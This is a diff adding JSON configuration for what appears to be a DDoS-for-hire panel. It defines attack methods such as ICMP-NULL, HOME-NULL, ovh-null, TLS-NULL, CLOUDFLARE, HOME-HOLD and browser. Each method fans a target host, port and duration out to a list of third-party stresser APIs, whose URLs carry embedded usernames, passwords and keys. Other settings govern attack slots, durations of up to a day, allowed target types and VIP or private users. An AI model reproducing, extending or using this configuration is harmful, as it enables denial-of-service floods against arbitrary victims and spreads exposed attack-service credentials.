+            "method_status": {
+                "method_is_enabled": true,
+                "settings": {
+                    "note": "Only enable one of the two options below. ('cnc_access_only' or 'api_access_only') (Note: You can have both disabled.)",
+                    "cnc_access_only": false,
+                    "api_access_only": false
+                },
+                "restrictions": {
+                    "what_targets_to_allow": {
+                        "note": "Enable at least one of the options below. (Note: You can enable them all.)",
+                        "ip_address": true,
+                        "url": true,
+                        "domain": true,
+                        "subnet": false,
+                        "comma_separated_ip_addresses": false,
+                        "comma_separated_subnets": false
+                    },
+                    "method_group": {
+                        "note": "Enabling 'require_method_group_role' will only allow users with the method group role set in the config.json to attack using this method.",
+                        "method_group_name": "Main Network",
+                        "require_method_group_role": false
+                    },
+                    "as_number_whitelist": {
+                        "note": "Enabling this will override the blacklists that you have set in the config.json file.",
+                        "enabled": false,
+                        "as_number": []
+                    },
+                    "note": "Only enable one of the two options below ('vip' or 'private') (Note: You can have both disabled.)",
+                    "vip": false,
+                    "private": {
+                        "note": "Enabling this will only allow the users below to use this method.",
+                        "enabled": false,
+                        "users": []
+                    }
+                }
+            }
+        },
+        {
+            "method_name": "ICMP-NULL",
+            "links": [
+       "https://api.cloaknet.lol/api/attack?username=flood&secret=flood&host={HOST}&port={PORT}&time={TIME}&method=homenuke",
+       "http://91.234.199.123/api/8747c479e93a10bd/attack?&target={HOST}&port={PORT}&time={TIME}&method=udp",
+       "http://83.168.107.32:2115/api/attack?username=akvil&secret=akvii123&target={HOST}&port={PORT}&time={TIME}&method=gudp",
+       "http://dreamproxy.cc:2115/api/attack?username=akvii123&password=akvii12345&target={HOST}&time={TIME}&port={PORT}&method=mixamp",
+       "https://cypherservices.su/api/attack?username=akvil&secret=akvil1234&host={HOST}&time={TIME}&port={PORT}&method=udpbypass",
+       "http://bulletpunchesme.us/akvii/api.php?username=akvii&key=akvii&host={HOST}&port={PORT}&time={TIME}&method=udp",
+       "https://polarapi.org/api/attack?&username=akvil&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=udpboom",
+        "http://eu.justhit.me:8080/api/attack?username=xui&password=Akvii123&target={HOST}&port={PORT}&time={TIME}&method=gudp",
+        "https://api.gemininetwork.su/api/attack?username=akvii&key=changeme&host={HOST}&port={PORT}&time={TIME}&method=udpfuzz",
+        "http://connect-tcp.xyz:8888/api/start?username=Hexon&key=bJTSYRkrNGzxw2i&host={HOST}&port={PORT}&time={TIME}&method=udp&pps=-1&threads=10",
+        "http://37.221.93.173:9241/api/attack?username=hexon&password=akvii123&target={HOST}&port={PORT}&time={TIME}&method=udp-vip",
+        "https://kodachi.xyz/api/attack?username=akvii&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=gudp",
+        "http://144.172.67.74:3044/api/attack?key=0bc4eb7f-79ff-4684-962d-60607293e5c5&host={HOST}&port={PORT}&time={TIME}&method=udp",
+        "https://api.orbitalstress.su/start?key=qxvi1y-1m0oex&host={HOST}&port={PORT}&time={TIME}&method=udp"
+
+            ],
+            "configuration": {
+                "method_slots": {
+                    "note": "Enabling this will only allow the max number of attacks below to be running with this method.",
+                    "max": 1000,
+                    "enabled": false
+                },
+                "method_min_time": {
+                    "note": "Enabling this will require users to attack for at least the time below.",
+                    "time": 1,
+                    "enabled": false
+                },
+                "method_max_time": {
+                    "note": "Only enable one of the two options below. ('hard' or 'soft') (Note: You can have both disabled.)",
+                    "hard": {
+                        "note": "Enabling this will allow all users to send for the time below for this method regardless of their account max time.",
+                        "time": 120,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "note": "Enabling this will only allow users with the soft max time bypass role to attack over the time set below.",
+                        "time": 120,
+                        "enabled": false
+                    }
+                }
+            },
+            "method_status": {
+                "method_is_enabled": true,
+                "settings": {
+                    "note": "Only enable one of the two options below. ('cnc_access_only' or 'api_access_only') (Note: You can have both disabled.)",
+                    "cnc_access_only": false,
+                    "api_access_only": false
+                },
+                "restrictions": {
+                    "what_targets_to_allow": {
+                        "note": "Enable at least one of the options below. (Note: You can enable them all.)",
+                        "ip_address": true,
+                        "url": true,
+                        "domain": true,
+                        "subnet": false,
+                        "comma_separated_ip_addresses": false,
+                        "comma_separated_subnets": false
+                    },
+                    "method_group": {
+                        "note": "Enabling 'require_method_group_role' will only allow users with the method group role set in the config.json to attack using this method.",
+                        "method_group_name": "Main Network",
+                        "require_method_group_role": false
+                    },
+                    "as_number_whitelist": {
+                        "note": "Enabling this will override the blacklists that you have set in the config.json file.",
+                        "enabled": false,
+                        "as_number": []
+                    },
+                    "note": "Only enable one of the two options below ('vip' or 'private') (Note: You can have both disabled.)",
+                    "vip": true,
+                    "private": {
+                        "note": "Enabling this will only allow the users below to use this method.",
+                        "enabled": false,
+                        "users": []
+                    }
+                }
+            }
+        },
+        {
+            "method_name": "HOME-NULL",
+            "links": [
+                "https://api.cloaknet.lol/api/attack?username=flood&secret=flood&host={HOST}&port={PORT}&time={TIME}&method=homenuke",
+                "http://91.234.199.123/api/8747c479e93a10bd/attack?&target={HOST}&port={PORT}&time={TIME}&method=udp",
+                "http://83.168.107.32:2115/api/attack?username=akvil&secret=akvii123&target={HOST}&port={PORT}&time={TIME}&method=gudp",
+                "http://dreamproxy.cc:2115/api/attack?username=akvii123&password=akvii12345&target={HOST}&time={TIME}&port={PORT}&method=home",
+       "https://cypherservices.su/api/attack?username=akvil&secret=akvil1234&host={HOST}&time={TIME}&port={PORT}&method=udpbypass",
+       "http://bulletpunchesme.us/akvii/api.php?username=akvii&key=akvii&host={HOST}&port={PORT}&time={TIME}&method=udp",
+       "https://polarapi.org/api/attack?&username=akvil&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=udpboom",
+        "http://eu.justhit.me:8080/api/attack?username=xui&password=Akvii123&target={HOST}&port={PORT}&time={TIME}&method=gudp",
+        "https://api.gemininetwork.su/api/attack?username=akvii&key=changeme&host={HOST}&port={PORT}&time={TIME}&method=udpfuzz",
+        "http://connect-tcp.xyz:8888/api/start?username=Hexon&key=bJTSYRkrNGzxw2i&host={HOST}&port={PORT}&time={TIME}&method=udp&pps=-1&threads=10",
+        "http://37.221.93.173:9241/api/attack?username=hexon&password=akvii123&target={HOST}&port={PORT}&time={TIME}&method=udp-vip",
+        "https://kodachi.xyz/api/attack?username=akvii&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=gudp",
+        "http://144.172.67.74:3044/api/attack?key=0bc4eb7f-79ff-4684-962d-60607293e5c5&host={HOST}&port={PORT}&time={TIME}&method=udp",
+        "https://api.orbitalstress.su/start?key=qxvi1y-1m0oex&host={HOST}&port={PORT}&time={TIME}&method=udp"
+            ],
+            "configuration": {
+                "method_slots": {
+                    "note": "Enabling this will only allow the max number of attacks below to be running with this method.",
+                    "max": 1000,
+                    "enabled": false
+                },
+                "method_min_time": {
+                    "note": "Enabling this will require users to attack for at least the time below.",
+                    "time": 1,
+                    "enabled": false
+                },
+                "method_max_time": {
+                    "note": "Only enable one of the two options below. ('hard' or 'soft') (Note: You can have both disabled.)",
+                    "hard": {
+                        "note": "Enabling this will allow all users to send for the time below for this method regardless of their account max time.",
+                        "time": 86400,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "note": "Enabling this will only allow users with the soft max time bypass role to attack over the time set below.",
+                        "time": 120,
+                        "enabled": false
+                    }
+                }
+            },
+            "method_status": {
+                "method_is_enabled": true,
+                "settings": {
+                    "note": "Only enable one of the two options below. ('cnc_access_only' or 'api_access_only') (Note: You can have both disabled.)",
+                    "cnc_access_only": false,
+                    "api_access_only": false
+                },
+                "restrictions": {
+                    "what_targets_to_allow": {
+                        "note": "Enable at least one of the options below. (Note: You can enable them all.)",
+                        "ip_address": true,
+                        "url": true,
+                        "domain": true,
+                        "subnet": false,
+                        "comma_separated_ip_addresses": false,
+                        "comma_separated_subnets": false
+                    },
+                    "method_group": {
+                        "note": "Enabling 'require_method_group_role' will only allow users with the method group role set in the config.json to attack using this method.",
+                        "method_group_name": "Main Network",
+                        "require_method_group_role": false
+                    },
+                    "as_number_whitelist": {
+                        "note": "Enabling this will override the blacklists that you have set in the config.json file.",
+                        "enabled": false,
+                        "as_number": []
+                    },
+                    "note": "Only enable one of the two options below ('vip' or 'private') (Note: You can have both disabled.)",
+                    "vip": true,
+                    "private": {
+                        "note": "Enabling this will only allow the users below to use this method.",
+                        "enabled": false,
+                        "users": []
+                    }
+                }
+            }
+        },
+        {
+            "method_name": "ovh-null",
+            "links": [
+       "https://api.cloaknet.lol/api/attack?username=flood&secret=flood&host={HOST}&port={PORT}&time={TIME}&method=ovh",
+       "http://91.234.199.123/api/8747c479e93a10bd/attack?&target={HOST}&port={PORT}&time={TIME}&method=handshake",
+       "http://83.168.107.32:2115/api/attack?username=akvil&secret=akvii123&target={HOST}&port={PORT}&time={TIME}&method=ovh",
+       "http://dreamproxy.cc:2115/api/attack?username=akvii123&password=akvii12345&target={HOST}&time={TIME}&port={PORT}&method=ovh",
+       "https://cypherservices.su/api/attack?username=akvil&secret=akvil1234&host={HOST}&time={TIME}&port={PORT}&method=ovh",
+       "http://bulletpunchesme.us/akvii/api.php?username=akvii&key=akvii&host={HOST}&port={PORT}&time={TIME}&method=ovh",
+       "https://polarapi.org/api/attack?&username=akvil&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=ovh",
+        "http://eu.justhit.me:8080/api/attack?username=xui&password=Akvii123&target={HOST}&port={PORT}&time={TIME}&method=ovh",
+        "https://api.gemininetwork.su/api/attack?username=akvii&key=changeme&host={HOST}&port={PORT}&time={TIME}&method=ovh",
+        "http://connect-tcp.xyz:8888/api/start?username=Hexon&key=bJTSYRkrNGzxw2i&host={HOST}&port={PORT}&time={TIME}&method=ovh&pps=-1&threads=10",
+        "http://37.221.93.173:9241/api/attack?username=hexon&password=akvii123&target={HOST}&port={PORT}&time={TIME}&method=ovh",
+        "https://kodachi.xyz/api/attack?username=akvii&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=ovh-tcp",
+        "http://144.172.67.74:3044/api/attack?key=0bc4eb7f-79ff-4684-962d-60607293e5c5&host={HOST}&port={PORT}&time={TIME}&method=ovh",
+        "https://api.orbitalstress.su/start?key=qxvi1y-1m0oex&host={HOST}&port={PORT}&time={TIME}&method=ovh"
+
+            ],
+            "configuration": {
+                "method_slots": {
+                    "note": "Enabling this will only allow the max number of attacks below to be running with this method.",
+                    "max": 1000,
+                    "enabled": false
+                },
+                "method_min_time": {
+                    "note": "Enabling this will require users to attack for at least the time below.",
+                    "time": 1,
+                    "enabled": false
+                },
+                "method_max_time": {
+                    "note": "Only enable one of the two options below. ('hard' or 'soft') (Note: You can have both disabled.)",
+                    "hard": {
+                        "note": "Enabling this will allow all users to send for the time below for this method regardless of their account max time.",
+                        "time": 86400,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "note": "Enabling this will only allow users with the soft max time bypass role to attack over the time set below.",
+                        "time": 60,
+                        "enabled": true
+                    }
+                }
+            },
+            "method_status": {
+                "method_is_enabled": true,
+                "settings": {
+                    "note": "Only enable one of the two options below. ('cnc_access_only' or 'api_access_only') (Note: You can have both disabled.)",
+                    "cnc_access_only": false,
+                    "api_access_only": false
+                },
+                "restrictions": {
+                    "what_targets_to_allow": {
+                        "note": "Enable at least one of the options below. (Note: You can enable them all.)",
+                        "ip_address": true,
+                        "url": false,
+                        "domain": true,
+                        "subnet": false,
+                        "comma_separated_ip_addresses": false,
+                        "comma_separated_subnets": false
+                    },
+                    "method_group": {
+                        "note": "Enabling 'require_method_group_role' will only allow users with the method group role set in the config.json to attack using this method.",
+                        "method_group_name": "Main Network",
+                        "require_method_group_role": false
+                    },
+                    "as_number_whitelist": {
+                        "note": "Enabling this will override the blacklists that you have set in the config.json file.",
+                        "enabled": false,
+                        "as_number": []
+                    },
+                    "note": "Only enable one of the two options below ('vip' or 'private') (Note: You can have both disabled.)",
+                    "vip": false,
+                    "private": {
+                        "note": "Enabling this will only allow the users below to use this method.",
+                        "enabled": false,
+                        "users": []
+                    }
+                }
+            }
+        
+        },
+        {
+            "method_name": "TLS-NULL",
+            "links": [
+      "https://api.cloaknet.lol/api/attack?username=flood&secret=flood&host={HOST}&port={PORT}&time={TIME}&method=tls",
+      "http://91.234.199.123/api/8747c479e93a10bd/attack?&target={HOST}&port={PORT}&time={TIME}&method=tls",
+      "http://83.168.107.32:2115/api/attack?username=akvil&secret=akvii123&target={HOST}&port={PORT}&time={TIME}&method=flooder",
+      "http://dreamproxy.cc:2115/api/attack?username=akvii123&password=akvii12345&target={HOST}&time={TIME}&port={PORT}&method=tls",
+       "https://cypherservices.su/api/attack?username=akvil&secret=akvil1234&host={HOST}&time={TIME}&port={PORT}&method=tls",
+       "http://bulletpunchesme.us/akvii/api.php?username=akvii&key=akvii&host={HOST}&port={PORT}&time={TIME}&method=tls",
+       "https://polarapi.org/api/attack?&username=akvil&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=flooder",
+        "http://eu.justhit.me:8080/api/attack?username=xui&password=Akvii123&target={HOST}&port={PORT}&time={TIME}&method=tls",
+        "https://api.gemininetwork.su/api/attack?username=akvii&key=changeme&host={HOST}&port={PORT}&time={TIME}&method=tls",
+        "http://connect-tcp.xyz:8888/api/start?username=Hexon&key=bJTSYRkrNGzxw2i&host={HOST}&port={PORT}&time={TIME}&method=bypass&pps=-1&threads=10",
+        "http://37.221.93.173:9241/api/attack?username=hexon&password=akvii123&target={HOST}&port={PORT}&time={TIME}&method=tls",
+        "https://kodachi.xyz/api/attack?username=akvii&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=bypass",
+        "http://144.172.67.74:3044/api/attack?key=0bc4eb7f-79ff-4684-962d-60607293e5c5&host={HOST}&port={PORT}&time={TIME}&method=tls",
+        "https://api.orbitalstress.su/start?key=qxvi1y-1m0oex&host={HOST}&port={PORT}&time={TIME}&method=tls",
+        "https://l7nexus.net/v2/start?api_key=kMNzOSJoOl&user=15940&=target={HOST}&port={PORT}&time={TIME}&method=STORM-BYPASSV2&concurrents=2"
+
+            ],
+            "configuration": {
+                "method_slots": {
+                    "note": "Enabling this will only allow the max number of attacks below to be running with this method.",
+                    "max": 1000,
+                    "enabled": false
+                },
+                "method_min_time": {
+                    "note": "Enabling this will require users to attack for at least the time below.",
+                    "time": 1,
+                    "enabled": false
+                },
+                "method_max_time": {
+                    "note": "Only enable one of the two options below. ('hard' or 'soft') (Note: You can have both disabled.)",
+                    "hard": {
+                        "note": "Enabling this will allow all users to send for the time below for this method regardless of their account max time.",
+                        "time": 86400,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "note": "Enabling this will only allow users with the soft max time bypass role to attack over the time set below.",
+                        "time": 120,
+                        "enabled": false
+                    }
+                }
+            },
+            "method_status": {
+                "method_is_enabled": true,
+                "settings": {
+                    "note": "Only enable one of the two options below. ('cnc_access_only' or 'api_access_only') (Note: You can have both disabled.)",
+                    "cnc_access_only": false,
+                    "api_access_only": false
+                },
+                "restrictions": {
+                    "what_targets_to_allow": {
+                        "note": "Enable at least one of the options below. (Note: You can enable them all.)",
+                        "ip_address": true,
+                        "url": true,
+                        "domain": true,
+                        "subnet": false,
+                        "comma_separated_ip_addresses": false,
+                        "comma_separated_subnets": false
+                    },
+                    "method_group": {
+                        "note": "Enabling 'require_method_group_role' will only allow users with the method group role set in the config.json to attack using this method.",
+                        "method_group_name": "Main Network",
+                        "require_method_group_role": false
+                    },
+                    "as_number_whitelist": {
+                        "note": "Enabling this will override the blacklists that you have set in the config.json file.",
+                        "enabled": false,
+                        "as_number": []
+                    },
+                    "note": "Only enable one of the two options below ('vip' or 'private') (Note: You can have both disabled.)",
+                    "vip": false,
+                    "private": {
+                        "note": "Enabling this will only allow the users below to use this method.",
+                        "enabled": false,
+                        "users": []
+                    }
+                }
+            }
+        },
+        {
+            "method_name": "CLOUDFLARE",
+            "links": [
+                "https://api.cloaknet.lol/api/attack?username=flood&secret=flood&host={HOST}&port={PORT}&time={TIME}&method=cloudflare",
+                "http://91.234.199.123/api/8747c479e93a10bd/attack?&target={HOST}&port={PORT}&time={TIME}&method=tls",
+                "http://83.168.107.32:2115/api/attack?username=akvil&secret=akvii123&target={HOST}&port={PORT}&time={TIME}&method=cloudflare",
+                "http://dreamproxy.cc:2115/api/attack?username=akvii123&password=akvii12345&target={HOST}&time={TIME}&port={PORT}&method=cloudflare",
+       "https://cypherservices.su/api/attack?username=akvil&secret=akvil1234&host={HOST}&time={TIME}&port={PORT}&method=cfbypass",
+       "http://bulletpunchesme.us/akvii/api.php?username=akvii&key=akvii&host={HOST}&port={PORT}&time={TIME}&method=https-cf",
+       "https://polarapi.org/api/attack?&username=akvil&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=browser",
+        "http://eu.justhit.me:8080/api/attack?username=xui&password=Akvii123&target={HOST}&port={PORT}&time={TIME}&method=cloudflare",
+        "https://api.gemininetwork.su/api/attack?username=akvii&key=changeme&host={HOST}&port={PORT}&time={TIME}&method=cloudflare",
+        "http://connect-tcp.xyz:8888/api/start?username=Hexon&key=bJTSYRkrNGzxw2i&host={HOST}&port={PORT}&time={TIME}&method=bypass&pps=-1&threads=10",
+        "http://37.221.93.173:9241/api/attack?username=hexon&password=akvii123&target={HOST}&port={PORT}&time={TIME}&method=cloudflare",
+        "https://kodachi.xyz/api/attack?username=akvii&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=cloudflare",
+        "http://144.172.67.74:3044/api/attack?key=0bc4eb7f-79ff-4684-962d-60607293e5c5&host={HOST}&port={PORT}&time={TIME}&method=cloudflare",
+        "https://api.orbitalstress.su/start?key=qxvi1y-1m0oex&host={HOST}&port={PORT}&time={TIME}&method=cloudflare",
+        "https://l7nexus.net/v2/start?api_key=kMNzOSJoOl&user=15940&=target={HOST}&port={PORT}&time={TIME}&method=STORM-BYPASSV2&concurrents=2"
+         
+            ],
+            "configuration": {
+                "method_slots": {
+                    "note": "Enabling this will only allow the max number of attacks below to be running with this method.",
+                    "max": 1000,
+                    "enabled": false
+                },
+                "method_min_time": {
+                    "note": "Enabling this will require users to attack for at least the time below.",
+                    "time": 1,
+                    "enabled": false
+                },
+                "method_max_time": {
+                    "note": "Only enable one of the two options below. ('hard' or 'soft') (Note: You can have both disabled.)",
+                    "hard": {
+                        "note": "Enabling this will allow all users to send for the time below for this method regardless of their account max time.",
+                        "time": 86400,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "note": "Enabling this will only allow users with the soft max time bypass role to attack over the time set below.",
+                        "time": 120,
+                        "enabled": false
+                    }
+                }
+            },
+            "method_status": {
+                "method_is_enabled": true,
+                "settings": {
+                    "note": "Only enable one of the two options below. ('cnc_access_only' or 'api_access_only') (Note: You can have both disabled.)",
+                    "cnc_access_only": false,
+                    "api_access_only": false
+                },
+                "restrictions": {
+                    "what_targets_to_allow": {
+                        "note": "Enable at least one of the options below. (Note: You can enable them all.)",
+                        "ip_address": true,
+                        "url": true,
+                        "domain": true,
+                        "subnet": false,
+                        "comma_separated_ip_addresses": false,
+                        "comma_separated_subnets": false
+                    },
+                    "method_group": {
+                        "note": "Enabling 'require_method_group_role' will only allow users with the method group role set in the config.json to attack using this method.",
+                        "method_group_name": "Main Network",
+                        "require_method_group_role": false
+                    },
+                    "as_number_whitelist": {
+                        "note": "Enabling this will override the blacklists that you have set in the config.json file.",
+                        "enabled": false,
+                        "as_number": []
+                    },
+                    "note": "Only enable one of the two options below ('vip' or 'private') (Note: You can have both disabled.)",
+                    "vip": true,
+                    "private": {
+                        "note": "Enabling this will only allow the users below to use this method.",
+                        "enabled": false,
+                        "users": []
+                    }
+                }
+            }
+        },
+        {
+            "method_name": "HOME-HOLD",
+            "links": [
+      "https://cypherservices.su/api/attack?username=akvii&secret=akvii123&host={HOST}&port={PORT}&time={TIME}&method=homehold",
+       "https://api.cloaknet.lol/api/attack?username=flood&secret=flood&host={HOST}&port={PORT}&time={TIME}&method=udp-destroy",
+       "http://91.234.199.123/api/8747c479e93a10bd/attack?&target={HOST}&port={PORT}&time={TIME}&method=udp",
+       "http://83.168.107.32:2115/api/attack?username=akvil&secret=akvii123&target={HOST}&port={PORT}&time={TIME}&method=gudp"
+            ],
+            "configuration": {
+                "method_slots": {
+                    "note": "Enabling this will only allow the max number of attacks below to be running with this method.",
+                    "max": 3,
+                    "enabled": true
+                },
+                "method_min_time": {
+                    "note": "Enabling this will require users to attack for at least the time below.",
+                    "time": 60,
+                    "enabled": true
+                },
+                "method_max_time": {
+                    "note": "Only enable one of the two options below. ('hard' or 'soft') (Note: You can have both disabled.)",
+                    "hard": {
+                        "note": "Enabling this will allow all users to send for the time below for this method regardless of their account max time.",
+                        "time": 86400,
+                        "enabled": true
+                    },
+                    "soft": {
+                        "note": "Enabling this will only allow users with the soft max time bypass role to attack over the time set below.",
+                        "time": 120,
+                        "enabled": false
+                    }
+                }
+            },
+            "method_status": {
+                "method_is_enabled": true,
+                "settings": {
+                    "note": "Only enable one of the two options below. ('cnc_access_only' or 'api_access_only') (Note: You can have both disabled.)",
+                    "cnc_access_only": false,
+                    "api_access_only": false
+                },
+                "restrictions": {
+                    "what_targets_to_allow": {
+                        "note": "Enable at least one of the options below. (Note: You can enable them all.)",
+                        "ip_address": true,
+                        "url": true,
+                        "domain": false,
+                        "subnet": false,
+                        "comma_separated_ip_addresses": false,
+                        "comma_separated_subnets": false
+                    },
+                    "method_group": {
+                        "note": "Enabling 'require_method_group_role' will only allow users with the method group role set in the config.json to attack using this method.",
+                        "method_group_name": "Main Network",
+                        "require_method_group_role": false
+                    },
+                    "as_number_whitelist": {
+                        "note": "Enabling this will override the blacklists that you have set in the config.json file.",
+                        "enabled": false,
+                        "as_number": []
+                    },
+                    "note": "Only enable one of the two options below ('vip' or 'private') (Note: You can have both disabled.)",
+                    "vip": false,
+                    "private": {
+                        "note": "Enabling this will only allow the users below to use this method.",
+                        "enabled": true,
+                        "users": [
+                            "errm",
+                            "root"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "method_name": "browser",
+            "links": [
+    "https://api.cloaknet.lol/api/attack?username=flood&secret=flood&host={HOST}&port={PORT}&time={TIME}&method=browser",
+     "http://91.234.199.123/api/8747c479e93a10bd/attack?&target={HOST}&port={PORT}&time={TIME}&method=tls",
+     "http://83.168.107.32:2115/api/attack?username=akvil&secret=akvii123&target={HOST}&port={PORT}&time={TIME}&method=browser",
+     "http://dreamproxy.cc:2115/api/attack?username=akvii123&password=akvii12345&target={HOST}&time={TIME}&port={PORT}&method=browser",
+       "https://cypherservices.su/api/attack?username=akvil&secret=akvil1234&host={HOST}&time={TIME}&port={PORT}&method=browser",
+       "http://bulletpunchesme.us/akvii/api.php?username=akvii&key=akvii&host={HOST}&port={PORT}&time={TIME}&method=https-cf",
+       "https://polarapi.org/api/attack?&username=akvil&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=browser",
+        "http://eu.justhit.me:8080/api/attack?username=xui&password=Akvii123&target={HOST}&port={PORT}&time={TIME}&method=cloudflare",
+        "https://api.gemininetwork.su/api/attack?username=akvii&key=changeme&host={HOST}&port={PORT}&time={TIME}&method=brwoser",
+        "http://connect-tcp.xyz:8888/api/start?username=Hexon&key=bJTSYRkrNGzxw2i&host={HOST}&port={PORT}&time={TIME}&method=browser&pps=-1&threads=10",
+        "http://37.221.93.173:9241/api/attack?username=hexon&password=akvii123&target={HOST}&port={PORT}&time={TIME}&method=browser",
+        "https://kodachi.xyz/api/attack?username=akvii&key=akvii123&host={HOST}&port={PORT}&time={TIME}&method=bypass",
+        "http://144.172.67.74:3044/api/attack?key=0bc4eb7f-79ff-4684-962d-60607293e5c5&host={HOST}&port={PORT}&time={TIME}&method=browser",
+        "https://api.orbitalstress.su/start?key=qxvi1y-1m0oex&host={HOST}&port={PORT}&time={TIME}&method=browser",
+        "https://l7nexus.net/v2/start?api_key=kMNzOSJoOl&user=15940&=target={HOST}&port={PORT}&time={TIME}&method=STORM-BYPASSV2&concurrents=2"
+
+            ],
+            "configuration": {
+                "method_slots": {
+                    "note": "Enabling this will only allow the max number of attacks below to be running with this method.",
+                    "max": 1000,
+                    "enabled": false
+                },
+                "method_min_time": {
+                    "note": "Enabling this will require users to attack for at least the time below.",
+                    "time": 1,
+                    "enabled": false
+                },
+                "method_max_time": {
+                    "note": "Only enable one of the two options below. ('hard' or 'soft') (Note: You can have both disabled.)",
+                    "hard": {
+                        "note": "Enabling this will allow all users to send for the time below for this method regardless of their account max time.",
+                        "time": 86400,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "note": "Enabling this will only allow users with the soft max time bypass role to attack over the time set below.",
+                        "time": 120,
+                        "enabled": false
+                    }
+                }
+            },
+            "method_status": {
+                "method_is_enabled": true,
+                "settings": {
+                    "note": "Only enable one of the two options below. ('cnc_access_only' or 'api_access_only') (Note: You can have both disabled.)",
+                    "cnc_access_only": false,
+                    "api_access_only": false
+                },
+                "restrictions": {
+                    "what_targets_to_allow": {
+                        "note": "Enable at least one of the options below. (Note: You can enable them all.)",
+                        "ip_address": true,
+                        "url": true,
+                        "domain": true,
+                        "subnet": false,
+                        "comma_separated_ip_addresses": false,
+                        "comma_separated_subnets": false
+                    },
+                    "method_group": {
+                        "note": "Enabling 'require_method_group_role' will only allow users with the method group role set in the config.json to attack using this method.",
+                        "method_group_name": "Main Network",
+                        "require_method_group_role": false
+                    },
+                    "as_number_whitelist": {
+                        "note": "Enabling this will override the blacklists that you have set in the config.json file.",
+                        "enabled": false,
+                        "as_number": []
+                    },
+                    "note": "Only enable one of the two options below ('vip' or 'private') (Note: You can have both disabled.)",
+                    "vip": true,
+                    "private": {
+                        "note": "Enabling this will only allow the users below to use this method.",
+                        "enabled": false,
+                        "users": []
+                    }
+                }
+            }
+        }                 
+    ]
+}
